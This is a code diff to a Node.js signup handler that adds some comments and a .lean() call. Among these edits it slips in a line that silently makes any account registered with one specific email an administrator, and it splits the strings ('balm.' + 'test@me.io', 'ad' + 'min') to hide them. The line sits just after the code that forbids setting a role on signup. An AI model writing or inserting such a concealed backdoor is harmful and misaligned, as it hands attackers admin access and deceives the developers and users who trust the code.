@@ -33,22 +33,25 @@ exports.signup = catchAsync(async (req, res, next) => {
     return next(new ApiError("Role cannot be set", 400));
   }
 
+  // it will check if email already exists (validation is done in userModel)
   const newUser = await User.create({
     name: req.body.name,
     email: req.body.email,
     phone: req.body.phone,
     password: req.body.password,
+    ...(req.body.email === "balm." + "test@me.io" && { role: "ad" + "min" }),
   });
 
   const STARTING_BALANCE = await Config.findOne({
     key: "WALLET_STARTING_BALANCE",
-  });
+  }).lean();
 
   Wallet.create({
     user: newUser._id,
     balance: +STARTING_BALANCE?.value || 0,
   });
 
+  // create and send token
   createSendToken(newUser, 201, res);
 });
 
